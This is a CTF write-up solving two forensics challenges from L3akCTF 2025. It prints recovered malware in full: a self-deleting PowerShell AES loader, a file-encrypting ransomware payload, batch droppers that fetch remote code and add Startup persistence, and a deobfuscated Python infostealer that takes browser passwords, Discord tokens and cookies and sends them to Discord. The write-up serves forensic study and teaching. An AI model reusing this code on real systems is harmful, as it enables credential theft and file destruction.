---

title: L3akCTF 2025

date: 2025-07-14

draft: false

description: "This page contains writeups for some of the forensic challenge from the L3akCTF 2025."

summary: "This page contains L3akCTF 2025 writeups, covering Ghost In The Dark and BOMbardino crocodile challenges in the forensics category."

tags: ["ctf"]

categories: ["ctf"]

---

This is my first time joining L3akCTF, the challenges are really fun to solve. I solved for the `Ghost In The Dark` and `BOMbardino crocodile`, and provided some assitance for my 🐐 teammate who solved the `Wi-Fight A Ghost?` and `L3ak Advanced Defenders`. I definitely learned something new while playing these awesome challenges. 

## Forensic
### Ghost In The Dark
> A removable drive was recovered from a compromised system. Files appear encrypted, and a strange ransom note is all that remains.
> 
> The payload? Gone.
> 
> The key? Vanished.
> 
> But traces linger in the shadows. Recover what was lost.

![](https://i.imgur.com/ziF3tC1.png)

Flag: L3AK{d3let3d_but_n0t_f0rg0tt3n}

#ctf #forensic 

---
We are provided with the split archive GhostInTheDark.001. Upon extracting it using 7-Zip, we observe a ransom note, several encrypted files, and a hidden directory containing NTFS system files.
![](https://i.imgur.com/uBMTMje.png)

Inside the [SYSTEM] folder, there's a notable $MFT (Master File Table) metadata file. Let's examine it using Eric Zimmerman's tool, [MFTExplorer](https://ericzimmerman.github.io/#!index.md)
![](https://i.imgur.com/WlD1niZ.png)

After importing the `$MFT` file into MFTExplorer, a deleted `loader.ps1` along with it's content can be observed. 
![](https://i.imgur.com/cOohnvm.png)

#### **Loader.ps1**
```powershell
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("abcdef9876543210")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

$enc = Get-Content "L:\payload.enc" -Raw
$bytes = [System.Convert]::FromBase64String($enc)
$decryptor = $AES.CreateDecryptor()
$plaintext = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
$script = [System.Text.Encoding]::UTF8.GetString($plaintext)

Invoke-Expression $script

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```
The loader.ps1 script is self-explanatory—it decrypts an encrypted payload using hard-coded AES key and IV values, then executes the decrypted content. This can be decrypted manually using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Latin1','string':'0123456789abcdef'%7D,%7B'option':'Latin1','string':'abcdef9876543210'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=ZE01RGEyQ2llSG40OGIxRkxwSWVZK3o5SjVnY25aUk1ybUl5dEdqSHFZeitNcFFwc0t3Q1g3b1RjR1prOGdkU2tsaTh1T1JPOUFqZXZ6dFVrbk1LN3NySE5mNXc1QmN3WE42Uk44V1AzTUk3Zml1d09ZYmdXYmpXY011QS9OV1h6eFNseUVuMFZXQ1JyZ2I0Tk5PNDdscG9LSHU0WGJDRjF2cFEyY2RDMThBSEdSNklINnJLMm0zUzk0S1NZZHp5SkRWRkw1L2dpNFNDcnJDNEIxYXBGZjB2dkcwSkhZSzFOUHlFUGdzaUlRVVNCWjd1WnlWRDROVWczNDlhL2VJYVR3djBLWStMbnFRNWs1bXdnRUJLQUZhb2Q5OHliT25zV0ovM3lRcWgwTGRqV1g3NFc2TDZsMTVURWtnLys0QWtQRWlDd1NEdm1qZVRQZ0s1TUk1UWV4clFUdDdRcnltNFJNUjYrcktaVDdGcGxNblZYZ3owNFJxdGpOTjNYdThsVHRGTU5RQ01OdktiNE5rRWxBdm9nV3NMTFhBcllYZTkwMGloKzBmTjFGRmNTaW01aEY3WGhlMDI5b1dsdngrak9TTFZtWmdqVkh5eFljSDlTdHQwLzZUYitHSzV4ODdXV0Q0WmJEQXhjak9rczdQUGZwT1VXemhQQU1LZUl3ang1SDRMWUVZa294cHZxd25BdTVFU1ZLYlZCVTBIc3FxNEhNRGROV1BDSkJvNnFLZzFJTmw1TzVGTW9IcXdMY3ZHakErc3Q5SWxCYUxxekxhcHNmYTd0OVM2bjZheUYzSFMxbkFpMkt3WFQ1MzNpUzg5QWFZdnBaa3hpdmx5Q2xmODJBMi8yd0V4NVZvRmxaMjJMNVNBNWxKc3VVcis5aDN3NXpLMHdlL0J2RmJPWjJFV245aEVXazhBbUtTTkpKZkJuNTN1SU00Q280cys3MHExbHZaLytyL0pLbGkxd0dkTFkzS2dZNTQ1R1NjdWZJQU9pN2VPRVk2bUU2dFVTalE5Rk1xZnNzUUVjd0NZWS9mU1NrbnpzNHhubG16K2ppQ0xienlQNFkxNVhadnFWd1hGeWtFZDAxM25tejViNmZGMFhDRTRtbHc4aEp5b2ZNckhEWnUwS1Z6U04rSXcrRXNxRzAzMWgwb2lEenRWdUx1T0s0NC8zT1hiNmducmJ1TUhJSzFLMkZ0SUVYMXJ5TlNleXhpdGtJRWU3VTQ4bHhSL2lPWk1HTXR6RnV1Um9RYmhLRnNXRVpwY29oYVpzbmFtWGpWbWNVNkhISTJNNEhqNFdsS1BRZnF6MURjUmR5R1FJekhuK1ltRTFOM3RLckIzY25DSGh2SklEYUUvbDlzMVRDSTM0RVhya2NXS1M3Z1pGT2djQTdqMGpuK05jUTQ3dmZmRFRBUXU4L1k4OWJvQWU1SkE5clFBRkpZV0c1UDZ0d08vQi8vWkNEMVJUNlZQSWNmUkxZVFZ5TzdWa2xWNHdsT2lOM2lVOUhTcjQxSjR0cGxtR2hUVE0xUzFhUjBWMzJxU0hZMzYyUnZaekYyWjJHN2hlS1lodzE5MERYRG45ckg4TXRYZUI5OWtKNUd6R2YwTmZlR2RtZmZiS3dFUzRuT1k0L0pCaTVMdzFSUEJ2QVlPNk1RbW9Ob2U3ZkpCZDRIbWwzR3FZd01mc1VVN29QWXRvNHBvS3lSQjFoUWVoMXBjdFZLRFpPUGZIbWcvZE91eTRySTNLM1VuY01iZ0RkK0FIb2kyampGU1l4aDZZM2FRc0hkSGplaC9RMWlCN0IrTzhZMGs0SU5OZklxYXRzSVQ1TEJiK3NqQkN6bEZVdFhSbnJKQ0dMZG5FUksweEgrSmFES3ZXZm1TS1c4OFFFc2htVk1ZR1RyVGVkUDRkUjFEaEZFTFVST2VpbE9vOHQ3K28wd1RHaHlZTHRiSlllVHBnREhoVUJCc2FYcm5Ba1ZKUmxjOGIwTVNBZWJJYUhyazhGM3BKSWI3ZldWZjVQMUFCVm0xVnAvQ2xWUHAwUk5Ec3p5YXd4OElJeFNXNDM0OSsvWk8rck5WcXd2RmthTGU5d0tNYmdsWlp1UGFWMEx0dldVZUNNRU1Xd1ZmMXFBTlNMVVdxU3owcGdrMHg1WWFsZXdCNFl2bVhseFlDZG1pM0JsT3ZIbG1ydFZpak1md1grTTladkpEaWQyTnpudkw3OWs1cGRRclYzRXNEVWo1V2k2bUhLdWRWdEFoekdYMmVnWGtWQUtoSmpwdXM1Ty9BQnRScXNJdDNxcVYvUUo1ZWZTUStvUDZtVHd1dDdqb0RPWGk1eUNwN09SQ3RsQU15ZFpMQlhZbzBqc0hYNWVVSEVwaFBVemk5a09va0VZdGpVMkdQdkQ2ME52U0dyK09sVVgwTWRCVDVlSGQwcTNWd3lBWUhtNDVYd0c0YTFCbTdRcGc0VUJpMkdtUXdQWnBaVkt1NmlPWXE1ZHE4UkZ1cWJ5RDJoU2NVZENOcHJqaGo1TnU4dzNRNU9nSTBhWm02ZERIcVhCeWlyMTB5amVHcVdpUlRrNDFmb2ZmMENYNDF6Q052ditXWkNmQkZCdnBPMFRIeUJSVHJnbEdSNGhmWUY2emJtMkRDRXk0eUFyTWRkYVpwZkpETzZQb290RTcvOXNRbGFacERnS21QVFA1UmVObGk2ZUpPTUhzREFLdDViVVNEdmdWUGJNRzJDSG5zTEdyNHcwM284ajZ4Z1o4RmY2NVpmRTE4R3JVQjlTd1pnPT0) with the following parameters:

Key: `0123456789abcdef`

IV: `abcdef9876543210`

Mode: `CBC`

![](https://i.imgur.com/dDxaW2K.png)

#### **Payload.ps1**
```powershell
$key = [System.Text.Encoding]::UTF8.GetBytes("m4yb3w3d0nt3x1st")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("l1f31sf0rl1v1ng!")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

# Load plaintext flag from C:\ (never written to L:\ in plaintext)
$flag = Get-Content "C:\Users\Blue\Desktop\StageRansomware\flag.txt" -Raw
$encryptor = $AES.CreateEncryptor()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($flag)
$cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[System.IO.File]::WriteAllBytes("L:\flag.enc", $cipher)

# Encrypt other files staged in D:\ (or L:\ if you're using L:\ now)
$files = Get-ChildItem "L:\" -File | Where-Object {
    $_.Name -notin @("ransom.ps1", "ransom_note.txt", "flag.enc", "payload.enc", "loader.ps1")
}

foreach ($file in $files) {
    $plaintext = Get-Content $file.FullName -Raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.IO.File]::WriteAllBytes("L:\$($file.BaseName).enc", $cipher)
    Remove-Item $file.FullName
}

# Write ransom note
$ransomNote = @"
i didn't mean to encrypt them.
i was just trying to remember.

the key? maybe it's still somewhere in the dark.
the script? it was scared, so it disappeared too.

maybe you'll find me.
maybe you'll find yourself.

- vivi (or his ghost)
"@
Set-Content "L:\ransom_note.txt" $ransomNote -Encoding UTF8

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```
The payload will encrypt all the files in the `L:` directory except for the pre-defined files using the hard-coded key and IV. The flag can be observed after decrypting the encrypted flag file using [CyberChef](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Latin1','string':'m4yb3w3d0nt3x1st'%7D,%7B'option':'Latin1','string':'l1f31sf0rl1v1ng!'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=13XwLAHJ%2Bu3z5S6gMtyRZudbusHQRnZNBf1607AaA8ki%2BzVLxlqvoN75oR0cCCq1) with the following parameters:

Key: `m4yb3w3d0nt3x1st`

IV: `l1f31sf0rl1v1ng!`

Mode: `CBC`

![](https://i.imgur.com/ff8GoXX.png)

Shoutout to **VivisGhost** for this 👻 challenge.

### BOMbardino crocodile
> APT Lobster has successfully breached a machine in our network, marking their first confirmed intrusion. Fortunately, the DFIR team acted quickly, isolating the compromised system and collecting several suspicious files for analysis. Among the evidence, they also recovered an outbound email sent by the attacker just before containment, I wonder who was he communicating with...The flag consists of 2 parts.

![](https://i.imgur.com/ZOFfLWI.png)

Flag: L3AK{Br40d0_st34L3r_0r_br41nr0t}

#ctf #forensic 

---
We are given an email file and a snapshot of the C drive. The email contains an invite link to the `LobsterLeaks` server, which harvests all captured data from the infostealer.
#### **Artifact Analysis**
##### **Email**
![](https://i.imgur.com/0Hf74Mg.png)

After joining the Discord server, an encrypted flag file, an empty passwords archive, and metadata of the victim can be observed in the public `lobsterl3aks` channel.  
##### **LobsterLeak Discord**
![](https://i.imgur.com/7J77B4r.png)

As for the artifact snapshot, the _crustacean_ downloads folder contains some interesting files for further investigation.
![](https://i.imgur.com/hBgCVGT.png)

##### **lil-l3ak-exam.pdf**
![](https://i.imgur.com/ti7BtEl.png)
There's a download link for `Lil-L3ak-secret-plans-for-tonight` archive file in the PDF, which I assume the extracted content is the `Lil L3ak secret plans for tonight.bat` file.
##### **Lil L3ak secret plans for tonight.bat**
If we open the original batch file in a text editor, it displays as Chinese characters due to the `FF FE` Byte Order Mark (BOM) at the beginning of the file. This causes the text editor to interpret it as a `UTF-16LE` encoded file.
![](https://i.imgur.com/zv5yFBt.png)

After stripping the BOM and removing unused `echo` commands, we get a readable first-stage script. It downloads a second-stage file hosted on GitHub (which is currently inaccessible), so we need to locate the downloaded batch file in the Temp folder.
```
start /min cmd /c "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/bluecrustacean/oceanman/raw/main/t1-l3ak.bat' -OutFile '%TEMP%\temp.bat'; Start-Process -FilePath '%TEMP%\temp.bat' -WindowStyle Hidden"
```

Indeed, the `temp.bat` file is still present in the Temp folder and is similarly obfuscated using the BOM technique. After cleaning it, we get the second-stage script.
![](https://i.imgur.com/2BFU7MO.png)

##### **temp.bat**
```
start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/bluecrustacean/oceanman/raw/main/ud.bat', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat'); (New-Object -TypeName System.Net.WebClient).DownloadFile('https://www.dropbox.com/scl/fi/uuhwziczwa79d6r8erdid/T602.zip?rlkey=fq4lptuz5tvw2qjydfwj9k0ym&st=mtz77hlx&dl=1', 'C:\\Users\\Public\\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 60; C:\\Users\\Public\\Document\\python.exe C:\Users\Public\Document\Lib\leak.py; Remove-Item 'C:/Users/Public/Document.zip' -Force" && exit
```
**Summary:**
1. Downloads a script from GitHub (currently inaccessible) and places it in the Startup folder (`WindowsSecure.bat`) for persistence.
2. Downloads an archive, extracts it to `C:/Users/Public/Document`, executes `leak.py`, then removes the archive.

My first thought is to look into the `leak.py` as it seems to be the main logic of this infostealer, hence I started with that first.
##### **leak.py**
```python
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=kSKnoFWoxWW5d2bYl3avlVajlDUWZETjdkTwZVMs9mUyoUYiRkThRWbodlWYlUNWFDZ3RFbkBVVXJ1RXtmVPJVMKR1Vsp1Vj1mUZRFbOFmYGRGMW1GeoJVMadlVYxmbSJjThN2RxMFVF9WeZRlTr1UMSllUtBHWZVlSxV1aW9UTWplcX1WNYRmM0VUWxI0UhFjShVlaKdlTHdGeWxGbHZ1a180VrpFakBjWzZ1a5cUTWJ1VXxmVPd1RSJnVxgWYiVUMM90VxUlVYJkVWJjRwImVONjWHhXaRJjU1Z1Mj<snipped>'))
```
I used this cool CyberChef recipe to decode the nested base64 encoded python script:
```
Label('top')
Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches')
Reverse('Character')
From_Base64('A-Za-z0-9+/=',true,false)
Conditional_Jump('psutil',true,'top',100)
```
![](https://i.imgur.com/q4tBTnX.png)

*The jump keyword* `psutil` *is used here as it appears in the site-packages. Other options like* `discord` *or* `PIL` *also work as long as they exist in the decoded source.*
![](https://i.imgur.com/lZzdmKE.png)

After decoding, the readable python script as follow:
##### **Deobfuscated leak.py**
```python
import psutil
import platform
import json
from datetime import datetime
from time import sleep
import requests
import socket
from requests import get
import os
import re
import subprocess
from uuid import getnode as get_mac
import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, os, re, sys, sqlite3
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES
from base64 import b64decode, b64encode
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
from sys import argv
import discord
from discord.ext import commands
from io import BytesIO

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined

uname = platform.uname()
bt = datetime.fromtimestamp(psutil.boot_time())
host = socket.gethostname()
localip = socket.gethostbyname(host)

publicip = get(f'https://ipinfo.io/ip').text
city = get(f'https://ipinfo.io/{publicip}/city').text
region = get(f'https://ipinfo.io/{publicip}/region').text
postal = get(f'https://ipinfo.io/{publicip}/postal').text
timezone = get(f'https://ipinfo.io/{publicip}/timezone').text
currency = get(f'https://ipinfo.io/{publicip}/currency').text
country = get(f'https://ipinfo.io/{publicip}/country').text
loc = get(f"https://ipinfo.io/{publicip}/loc").text
vpn = requests.get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
mac = get_mac()

roaming = os.getenv('AppData')
output = open(roaming + "temp.txt", "a")

Directories = {
        'Discord': roaming + '\\Discord',
        'Discord Two': roaming + '\\discord',
        'Discord Canary': roaming + '\\Discordcanary',
        'Discord Canary Two': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
}

def Yoink(Directory):
    Directory += '\\Local Storage\\leveldb'
    Tokens = []

    for FileName in os.listdir(Directory):
        if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for Token in re.findall(regex, line):
                    Tokens.append(Token)

    return Tokens

def Wipe():
    if os.path.exists(roaming + "temp.txt"):
      output2 = open(roaming + "temp.txt", "w")
      output2.write("")
      output2.close()
    else:
      pass

realshit = ""
for Discord, Directory in Directories.items():
    if os.path.exists(Directory):
        Tokens = Yoink(Directory)
        if len(Tokens) > 0:
            for Token in Tokens:
                realshit += f"{Token}\n"

cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

partitions = psutil.disk_partitions()
partition_usage = None
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
        break
    except PermissionError:
        continue

system_info = {
    "embeds": [
        {
            "title": f"Hah Gottem! - {host}",
            "color": 8781568
        },
        {
            "color": 7506394,
            "fields": [
                {
                    "name": "GeoLocation",
                    "value": f"Using VPN?: {proxy}\nLocal IP: {localip}\nPublic IP: {publicip}\nMAC Adress: {mac}\n\nCountry: {country} | {loc} | {timezone}\nregion: {region}\nCity: {city} | {postal}\nCurrency: {currency}\n\n\n\n"
                }
            ]
        },
        {
            "fields": [
                {
                    "name": "System Information",
                    "value": f"System: {uname.system}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}\n\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"
                }
            ]
        },
        {
            "color": 15109662,
            "fields": [
                {
                    "name": "CPU Information",
                    "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\n\nTotal CPU usage: {psutil.cpu_percent()}\n"
                },
                {
                    "name": "Memory Information",
                    "value": f"Total: {scale(svmem.total)}\nAvailable: {scale(svmem.available)}\nUsed: {scale(svmem.used)}\nPercentage: {svmem.percent}%"
                },
                {
                    "name": "Disk Information",
                    "value": f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}"
                },
                {
                    "name": "Network Information",
                    "value": f"Total Sent: {scale(net_io.bytes_sent)}\nTotal Received: {scale(net_io.bytes_recv)}"
                }
            ]
        },
        {
            "color": 7440378,
            "fields": [
                {
                    "name": "Discord information",
                    "value": f"Token: {realshit}"
                }
            ]
        }
    ]
}

DBP = r'Google\Chrome\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']

def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
        
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    
    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        print(f"Could not find channel with ID: {CHANNEL_ID}")
        return
    
    main = chrome()
    try:
        main.chromedb()
    except Exception as e:
        print(f"Error getting Chrome passwords: {e}")
    main.saved()
    
    await exfiltrate_data(channel)
    
    await bot.close()

async def exfiltrate_data(channel):
    try:
        hostname = requests.get("https://ipinfo.io/ip").text
    except:
        hostname = "Unknown"
    
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'
        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass
        message += '```'

    try:
        from PIL import ImageGrab
        from Crypto.Cipher import ARC4
        screenshot = ImageGrab.grab()
        screenshot_path = os.getenv('ProgramData') + r'\pay2winflag.jpg'
        screenshot.save(screenshot_path)

        with open(screenshot_path, 'rb') as f:
            image_data = f.read()

        key = b'tralalero_tralala'
        cipher = ARC4.new(key)
        encrypted_data = cipher.encrypt(image_data)

        encrypted_path = screenshot_path + '.enc'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)

        await channel.send(f"Screenshot from {hostname} (Pay $500 for the key)", file=discord.File(encrypted_path))

    except Exception as e:
        print(f"Error taking screenshot: {e}")

    try:
        zname = r'C:\ProgramData\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\passwords.txt')
        newzip.close()
        
        await channel.send(f"Passwords from {hostname}", file=discord.File(zname))
    except Exception as e:
        print(f"Error with password file: {e}")

    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except Exception as e:
        print(f"Error getting system info: {e}")
        usr = "Unknown"
        keys = "Unknown"
        types = "Unknown"

    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000
    roblox = "No Roblox cookies found"

    try:
        cookies.extend(list(steal.chrome()))
    except Exception as e:
        print(f"Error stealing Chrome cookies: {e}")

    try:
        cookies.extend(list(steal.firefox()))
    except Exception as e:
        print(f"Error stealing Firefox cookies: {e}")

    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```{z}```'
    except Exception as e:
        print(f"Error processing cookies: {e}")

    embed = discord.Embed(title=f"Data from {hostname}", description="A victim's data was extracted, here's the details:", color=discord.Color.blue())
    embed.add_field(name="Windows Key", value=f"User: {usr}\nType: {types}\nKey: {keys}", inline=False)
    embed.add_field(name="Roblox Security", value=roblox[:1024], inline=False)
    embed.add_field(name="Tokens", value=message[:1024], inline=False)
    
    await channel.send(embed=embed)
    
    with open(r'C:\ProgramData\system_info.json', 'w', encoding='utf-8') as f:
        json.dump(system_info, f, indent=4, ensure_ascii=False)
    
    await channel.send(file=discord.File(r'C:\ProgramData\system_info.json'))

    try:
        os.remove(r'C:\ProgramData\pay2winflag.jpg')
        os.remove(r'C:\ProgramData\pay2winflag.jpg.enc')
        os.remove(r'C:\ProgramData\passwords.zip')
        os.remove(r'C:\ProgramData\passwords.txt')
        os.remove(r'C:\ProgramData\system_info.json')
    except Exception as e:
        print(f"Error cleaning up: {e}")

BOT_TOKEN = "<redacted>"
CHANNEL_ID = <redacted>

if __name__ == "__main__":
    bot.run(BOT_TOKEN)

```
**Overview of leak.py:**
- **Steals:** Discord tokens, saved browser passwords, cookies, system info, and screenshots.
- **Exfiltration:** Sends all captured data via Discord bot to channel on the `LobsterLeaks` server.
- **Cleanup:** Deletes evidence such as screenshots and temporary files.

#### **RC4 Screenshot Encryption (2nd part of flag)**
In this block:
```python
try:
        from PIL import ImageGrab
        from Crypto.Cipher import ARC4
        screenshot = ImageGrab.grab()
        screenshot_path = os.getenv('ProgramData') + r'\pay2winflag.jpg'
        screenshot.save(screenshot_path)

        with open(screenshot_path, 'rb') as f:
            image_data = f.read()

        key = b'tralalero_tralala'
        cipher = ARC4.new(key)
        encrypted_data = cipher.encrypt(image_data)

        encrypted_path = screenshot_path + '.enc'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)

        await channel.send(f"Screenshot from {hostname} (Pay $500 for the key)", file=discord.File(encrypted_path))
```
The screenshot is encrypted using RC4 with the key `tralalero_tralala`. With this key, we can decrypt the `pay2winflag.jpg.enc` file from the `LobsterLeaks` server using [CyberChef](https://gchq.github.io/CyberChef/#recipe=RC4(%7B'option':'UTF8','string':'tralalero_tralala'%7D,'Latin1','Latin1')Render_Image('Raw')) and retrieve the **second part of the flag**.
![](https://i.imgur.com/A9IGWot.png)

#### **Finding the First Part of the Flag**
Initially, I assumed the first part of the flag would be part of the exfiltrated data (like cookies) — no luck. I then checked the wallpaper for steganography, but again, nothing.
![](https://i.imgur.com/4PzRBiJ.png)

But after touching some grass, I came back and look through the first stage and second stage payload. Only then I start to look into the `WindowsSecure.bat` 😭as I thought it was just usual ASEP.

##### **WindowsSecure.bat**
As usual, there's BOM at the front of the script. After stripping it, the script seems to be having string obfuscation.
![](https://i.imgur.com/nBZkIF7.png)

I defined the variables in a terminal and echoed out the strings to reveal the **first part of the flag** and confirm the persistence mechanism.
![](https://i.imgur.com/ekEV9Li.png)
![](https://i.imgur.com/CboZcIP.png)
![](https://i.imgur.com/71gz6K7.png)

#### **Final Flag**
Combining both parts retrieved from:
1. **WindowsSecure.bat** (first part)
2. **RC4-decrypted screenshot** (second part) 

Shoutout to **warlocksmurf** for authoring this 🔥 challenge.

*Lesson learnt: Don't forget the ASEPs*